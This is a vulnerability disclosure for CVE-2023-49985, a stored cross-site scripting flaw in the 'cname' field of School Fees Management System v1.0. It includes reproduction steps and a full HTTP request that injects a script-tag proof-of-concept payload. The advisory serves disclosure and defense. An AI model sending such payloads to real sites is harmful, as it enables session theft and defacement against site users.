# CVE-2023-49985
# School Fees Management System v1.0 - Cross-Site Scripting (XSS) Vulnerability in "cname" parameter on "new_class"

**Description**: A cross-site scripting (XSS) vulnerability in the component "new_class" of School Fees Management System v1.0 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the cname parameter. 

**Vulnerable Product Version**: School Fees Management System v1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49985  
**Tested on**: Windows  
### Steps to reproduce:  
To exploit the vulnerability, a user with appropriate permissions must access the "/ci_fms/admin/management/class" page. On this page, the user should either edit an existing class or add a new one. The malicious payload needs to be inserted into the "cname" parameter during this process.
### Request:  
```
POST /ci_fms/admin/action/new_class HTTP/1.1
Host: 192.168.68.148
Content-Length: 273
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.68.148
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbJT9XS9eFLU53MR
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.68.148/ci_fms/admin/management/class
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: ci_session=gdoj5tr7rsf7ci5o9rpr0rh5eni2r6an
Connection: close

------WebKitFormBoundaryAbJT9XS9eFLU53MR
Content-Disposition: form-data; name="cname"

<script>alert(document.domain)</script>
------WebKitFormBoundaryAbJT9XS9eFLU53MR
Content-Disposition: form-data; name="cfees"

12,000
------WebKitFormBoundaryAbJT9XS9eFLU53MR--
```

Discoverer(s)/Credits:  
Geraldo Alcântara
